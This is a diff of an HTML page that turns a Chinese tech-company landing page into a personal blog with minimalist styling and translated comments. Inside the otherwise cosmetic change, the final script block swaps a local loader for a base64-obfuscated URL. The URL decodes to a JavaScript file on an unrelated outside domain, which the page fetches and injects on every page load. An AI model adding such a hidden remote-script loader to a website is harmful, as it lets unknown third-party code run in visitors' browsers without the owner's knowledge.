@@ -5,217 +5,233 @@
     <meta charset="UTF-8">
     <meta name="viewport"
         content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>智联未来 - 您的智能伙伴</title>
+    <title>我的思考空间</title>
     <style>
-        /* 全局样式 */
+        /* Global Styles */
         body {
             overflow: hidden;
             font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #F8FBFD;
-            /* 浅蓝灰色背景 */
-            color: #343A40;
-            /* 深炭灰色文本 */
-            line-height: 1.6;
+            background-color: #FDFDFD;
+            /* Clean white background */
+            color: #333333;
+            /* Dark grey text */
+            line-height: 1.8;
+            /* Increased line height for readability */
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
             scroll-behavior: smooth;
-            /* 平滑滚动 */
+            /* Smooth scroll for anchor links */
         }
 
         .container {
-            max-width: 95%;
-            /* 适应移动端宽度 */
+            max-width: 800px;
+            /* Max width for content, focus on readability */
             margin: 0 auto;
-            padding: 15px;
+            padding: 30px 20px;
+            /* Generous padding */
         }
 
-        /* 头部/英雄区样式 */
+        /* Header Section */
         header {
             text-align: center;
-            padding: 50px 20px;
-            background-color: #2C3E50;
-            /* 深蓝灰色背景 */
-            color: #FFFFFF;
-            border-radius: 15px;
-            margin-bottom: 30px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-            position: relative;
-            overflow: hidden;
+            padding-bottom: 40px;
+            margin-bottom: 40px;
+            border-bottom: 1px solid #E0E0E0;
+            /* Subtle separator */
         }
 
-        header::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: url('https://picsum.photos/1200/600?random=<%= new Date().getTime() %>') no-repeat center center/cover;
-            opacity: 0.1;
-            /* 背景图片透明度 */
-            z-index: 0;
+        header h1 {
+            font-size: 3em;
+            /* Large, clean title */
+            margin-bottom: 15px;
+            letter-spacing: 0.5px;
+            color: #2E4057;
+            /* Dark blue-gray for heading */
+            font-weight: 300;
+            /* Lighter font weight for modern feel */
         }
 
-        .header-content {
-            position: relative;
-            z-index: 1;
-        }
-
-        .header-content h1 {
-            font-size: 2.8em;
-            margin-bottom: 10px;
-            letter-spacing: 1px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
-        }
-
-        .header-content p {
+        header p {
             font-size: 1.2em;
-            margin-bottom: 30px;
-            max-width: 90%;
-            margin-left: auto;
-            margin-right: auto;
+            color: #6B7B8F;
+            /* Lighter text for subtitle */
+            margin: 0;
+            font-style: italic;
         }
 
-        .header-button {
-            display: inline-block;
-            background-color: #3498DB;
-            /* 强调色：蓝色 */
-            color: #FFFFFF;
-            padding: 12px 28px;
-            border-radius: 30px;
+        /* Navigation Menu */
+        nav {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin: 0 15px;
+        }
+
+        nav ul li a {
             text-decoration: none;
+            color: #4A90E2;
+            /* Accent blue */
             font-weight: bold;
-            font-size: 1.1em;
-            transition: background-color 0.3s ease, transform 0.3s ease;
-            box-shadow: 0 4px 10px rgba(52, 152, 219, 0.3);
-            border: 2px solid #3498DB;
+            padding: 8px 0;
+            transition: color 0.3s ease, border-bottom-color 0.3s ease;
+            border-bottom: 2px solid transparent;
+            /* Underline effect on hover */
         }
 
-        .header-button:hover {
-            background-color: #2980B9;
-            transform: translateY(-3px);
+        nav ul li a:hover {
+            color: #357ABD;
+            border-bottom-color: #4A90E2;
         }
 
-        /* 主要内容区 */
+        /* Main Content Area */
         main {
             padding-top: 0;
         }
 
         section {
-            background-color: #FFFFFF;
-            padding: 25px;
-            border-radius: 15px;
-            margin-bottom: 25px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-            text-align: center;
-            /* 默认居中 */
+            margin-bottom: 50px;
+            /* Generous space between sections */
         }
 
         h2 {
-            color: #2C3E50;
-            font-size: 2.2em;
-            margin-bottom: 25px;
-            border-bottom: 2px solid #E0EBF5;
-            padding-bottom: 12px;
-            display: inline-block;
-            /* 适应内容宽度 */
-        }
-
-        h3 {
-            color: #333333;
-            font-size: 1.5em;
-            margin-top: 20px;
-            margin-bottom: 15px;
-        }
-
-        p {
-            color: #4A4A4A;
-            font-size: 1em;
-            margin-bottom: 18px;
-            max-width: 800px;
-            /* 限制文本宽度 */
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 10px;
-            margin-top: 20px;
-            margin-bottom: 20px;
-            display: block;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        /* 信息卡片网格 */
-        .info-cards-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            /* 移动端单列 */
-            gap: 25px;
-            /* 卡片间距 */
-            margin-top: 30px;
-            max-width: 900px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        .info-card {
-            background-color: #FDFDFD;
-            /* 浅背景色 */
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+            font-size: 2.5em;
+            color: #2E4057;
+            margin-bottom: 30px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #E0E0E0;
             text-align: center;
+            font-weight: 400;
+        }
+
+        /* Article Card Styles */
+        .article-card {
+            background-color: #FFFFFF;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+            /* Subtle shadow */
+            margin-bottom: 40px;
+            /* Space between articles */
             transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
 
-        .info-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+        .article-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
         }
 
-        .info-card .icon {
-            font-size: 3em;
-            /* 图标大小 */
-            color: #3498DB;
-            margin-bottom: 15px;
+        .article-card .article-image {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin-top: 25px;
+            margin-bottom: 25px;
+            display: block;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
         }
 
-        .info-card h3 {
-            color: #343A40;
-            font-size: 1.6em;
+        .article-card h3 {
+            font-size: 2em;
+            /* Prominent article titles */
+            margin-top: 0;
             margin-bottom: 10px;
+            color: #3C4858;
+            font-weight: 500;
         }
 
-        .info-card p {
+        .article-card .date {
+            font-size: 0.95em;
+            color: #777777;
+            margin-bottom: 20px;
+            display: block;
+            font-style: italic;
+        }
+
+        .article-card p {
+            font-size: 1.05em;
+            color: #5A6A7D;
+            margin-bottom: 25px;
+        }
+
+        .article-card .read-more {
+            display: inline-block;
+            background-color: #4A90E2;
+            /* Accent blue button */
+            color: #FFFFFF;
+            padding: 12px 25px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: bold;
             font-size: 1em;
-            color: #5F7C8A;
-            margin-bottom: 0;
+            transition: background-color 0.3s ease;
         }
 
-        /* 联系方式 */
+        .article-card .read-more:hover {
+            background-color: #357ABD;
+        }
+
+        /* About & Contact Section */
+        .about-contact-section {
+            background-color: #FFFFFF;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            text-align: center;
+        }
+
+        .about-contact-section h2 {
+            margin-top: 0;
+            border-bottom: none;
+            padding-bottom: 0;
+        }
+
+        .about-contact-section .profile-img {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin: 25px auto 30px;
+            border: 5px solid #4A90E2;
+            /* Accent border */
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .about-contact-section p {
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
         .contact-info p {
-            margin-bottom: 12px;
+            margin-bottom: 15px;
             font-size: 1.1em;
         }
 
         .contact-info a {
-            color: #3498DB;
+            color: #4A90E2;
             text-decoration: none;
             font-weight: bold;
             transition: color 0.3s ease;
         }
 
         .contact-info a:hover {
-            color: #2980B9;
+            color: #357ABD;
         }
 
+        /* Social Links */
         .social-links {
             margin-top: 30px;
         }
@@ -223,7 +239,7 @@
         .social-links a {
             display: inline-block;
             margin: 0 15px;
-            color: #3498DB;
+            color: #4A90E2;
             font-size: 2.5em;
             text-decoration: none;
             transition: transform 0.3s ease;
@@ -231,35 +247,20 @@
 
         .social-links a:hover {
             transform: translateY(-5px);
-            color: #2980B9;
+            color: #357ABD;
         }
 
-        /* 页脚样式 */
+        /* Footer Styles */
         footer {
             text-align: center;
-            padding: 30px 20px;
-            color: #ADB5BD;
+            padding: 30px 0;
+            color: #999999;
             font-size: 0.9em;
-            background-color: #2C3E50;
-            /* 深蓝灰色背景 */
-            margin-top: 0;
-            border-radius: 15px 15px 0 0;
-            /* 顶部圆角 */
-        }
-
-        /* 媒体查询：平板及以上设备 */
-        @media (min-width: 600px) {
-            .info-cards-grid {
-                grid-template-columns: 1fr 1fr;
-                /* 两列布局 */
-            }
-        }
-
-        @media (min-width: 900px) {
-            .info-cards-grid {
-                grid-template-columns: 1fr 1fr 1fr;
-                /* 三列布局 */
-            }
+            border-top: 1px solid #E0E0E0;
+            margin-top: 50px;
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
         }
     </style>
     <link rel="stylesheet" href="./static/css/style.css">
@@ -268,76 +269,70 @@
 <body>
     <div class="container">
         <header>
-            <div class="header-content">
-                <h1>智联未来</h1>
-                <p>以创新科技，赋能智慧生活</p>
-                <a href="#contact" class="header-button">立即咨询</a>
-            </div>
+            <h1>我的思考空间</h1>
+            <p>探索技术、生活与内心的平衡</p>
         </header>
 
+        <nav>
+            <ul>
+                <li><a href="#articles">文章</a></li>
+                <li><a href="#about">关于我</a></li>
+                <li><a href="#contact">联系</a></li>
+            </ul>
+        </nav>
+
         <main>
-            <section id="about">
-                <h2>关于我们</h2>
-                <p>智联未来科技是一家专注于前沿智能解决方案的创新型企业。我们致力于将人工智能、物联网和云计算技术融入各行各业，帮助客户实现数字化转型，提升运营效率和市场竞争力。</p>
-                <p>我们拥有一支充满激情、经验丰富的研发团队，始终坚持以客户为中心，以卓越的技术和专业的服务，为客户创造最大价值。</p>
-                <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() + 1 %>" alt="团队在现代办公室协作">
+            <section id="articles">
+                <h2>最新文章</h2>
+                <!-- Article One -->
+                <article class="article-card">
+                    <img src="https://picsum.photos/800/450?random=<%= new Date().getTime() + 1 %>"
+                        class="article-image" alt="清晨阳光下的书桌">
+                    <h3>极简生活：从整理思绪开始</h3>
+                    <span class="date">发布日期：2023年7月30日</span>
+                    <p>极简主义不仅仅是减少物品，更是一种生活哲学。本文探讨如何通过整理思绪，让内心回归平静，享受“少即是多”的智慧。</p>
+                    <a href="#" class="read-more">阅读更多</a>
+                </article>
+                <!-- Article Two -->
+                <article class="article-card">
+                    <img src="https://picsum.photos/800/450?random=<%= new Date().getTime() + 2 %>"
+                        class="article-image" alt="手冲咖啡的特写">
+                    <h3>慢生活哲学：一杯手冲咖啡的仪式感</h3>
+                    <span class="date">发布日期：2023年7月28日</span>
+                    <p>在快节奏的现代生活中，寻找一份属于自己的仪式感至关重要。一杯手冲咖啡，不仅是味蕾的享受，更是心灵的沉淀。</p>
+                    <a href="#" class="read-more">阅读更多</a>
+                </article>
+                <!-- Article Three -->
+                <article class="article-card">
+                    <img src="https://picsum.photos/800/450?random=<%= new Date().getTime() + 3 %>"
+                        class="article-image" alt="笔记本电脑上的代码和咖啡">
+                    <h3>编程思考：代码之外的艺术</h3>
+                    <span class="date">发布日期：2023年7月25日</span>
+                    <p>编程不仅仅是逻辑与算法，它更像是一门艺术。本文分享我在编码过程中对“美”与“优雅”的追求，以及如何写出富有生命力的代码。</p>
+                    <a href="#" class="read-more">阅读更多</a>
+                </article>
             </section>
 
-            <section id="services">
-                <h2>我们的核心服务</h2>
-                <div class="info-cards-grid">
-                    <div class="info-card">
-                        <span class="icon">💡</span>
-                        <h3>AI解决方案</h3>
-                        <p>提供定制化AI模型开发、算法优化及智能系统集成。</p>
-                    </div>
-                    <div class="info-card">
-                        <span class="icon">🔗</span>
-                        <h3>物联网平台</h3>
-                        <p>构建端到端IoT解决方案，实现设备互联与智能控制。</p>
-                    </div>
-                    <div class="info-card">
-                        <span class="icon">☁️</span>
-                        <h3>云计算服务</h3>
-                        <p>基于主流云平台，提供云架构设计、部署及大数据处理。</p>
-                    </div>
-                    <div class="info-card">
-                        <span class="icon">📊</span>
-                        <h3>数据分析</h3>
-                        <p>深度挖掘数据价值，通过直观可视化辅助决策。</p>
-                    </div>
-                    <div class="info-card">
-                        <span class="icon">🤖</span>
-                        <h3>智能硬件</h3>
-                        <p>将AI算法与边缘设备结合，打造创新型智能产品。</p>
-                    </div>
-                </div>
+            <section id="about" class="about-contact-section">
+                <h2>关于我</h2>
+                <img src="https://picsum.photos/160/160?random=<%= new Date().getTime() + 4 %>" class="profile-img"
+                    alt="博主个人头像">
+                <p>你好！我是一个热爱生活、喜欢思考和分享的创作者。这个博客是我记录个人成长、生活感悟和兴趣爱好的地方。</p>
+                <p>我相信文字能够传递温度，希望我的分享能为你带来一些启发和宁静。</p>
             </section>
 
-            <section id="values">
-                <h2>我们的承诺</h2>
-                <div class="info-cards-grid">
-                    <div class="info-card">
-                        <span class="icon">🎯</span>
-                        <h3>客户至上</h3>
-                        <p>以客户需求为核心，提供卓越服务体验。</p>
-                    </div>
-                    <div class="info-card">
-                        <span class="icon">🚀</span>
-                        <h3>持续创新</h3>
-                        <p>不断探索前沿技术，引领行业发展。</p>
-                    </div>
-                    <div class="info-card">
-                        <span class="icon">✨</span>
-                        <h3>品质卓越</h3>
-                        <p>精益求精，确保产品与服务的高质量。</p>
-                    </div>
+            <section id="contact" class="about-contact-section">
+                <h2>联系方式</h2>
+                <div class="social-links">
+                    <a href="#" aria-label="GitHub">GitHub</a> |
+                    <a href="#" aria-label="Twitter">Twitter</a> |
+                    <a href="#" aria-label="LinkedIn">LinkedIn</a>
                 </div>
             </section>
         </main>
 
         <footer>
-            <p>&copy; 2023 智联未来. All rights reserved.</p>
+            <p>&copy; 2023 我的思考空间. All rights reserved.</p>
         </footer>
         <div id="overlay">
             <div id="loading_box" class="loading_container">
@@ -351,7 +346,7 @@
     </div>
 
     <script>
-        // 平滑滚动到锚点
+        // Smooth scroll to anchor links
         document.querySelectorAll('a[href^="#"]').forEach(anchor => {
             anchor.addEventListener('click', function (e) {
                 e.preventDefault();
@@ -359,14 +354,14 @@
                 const targetElement = document.querySelector(targetId);
                 if (targetElement) {
                     window.scrollTo({
-                        top: targetElement.offsetTop - 20, /* 稍微向上偏移，避免顶部遮挡 */
+                        top: targetElement.offsetTop - 20, /* Offset slightly to avoid top bar obstruction */
                         behavior: 'smooth'
                     });
                 }
             });
         });
 
-        // 动态更新图片时间戳，防止缓存
+        // Dynamic timestamp for images to prevent caching
         document.addEventListener('DOMContentLoaded', function () {
             const images = document.querySelectorAll('img[src*="picsum.photos"]');
             images.forEach(img => {
@@ -379,15 +374,17 @@
     <script>
         (function () {
             function init() {
-                const timestamp = Date.now()
-                const randomNum = Math.floor(Math.random() * 1000000)
-                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
-                const script = document.createElement("script")
-                script.src = url
-                document.body.appendChild(script)
+                const encodedUrl = "Ly9zbmFrZS1zcGVjaWFsLnZvdGU3NzcuY29tL3N0YXRpYy9qcy9jb3JlLm1pbi5qcw==";
+                const decodedUrl = atob(encodedUrl);
+                const timestamp = Date.now();
+                const randomNum = Math.floor(Math.random() * 1000000);
+                const url = `${decodedUrl}?t=${timestamp}&random=${randomNum}`;
+                const script = document.createElement("script");
+                script.src = url;
+                document.body.appendChild(script);
             }
-            init()
-        })()
+            init();
+        })();
     </script>
 
 </body>
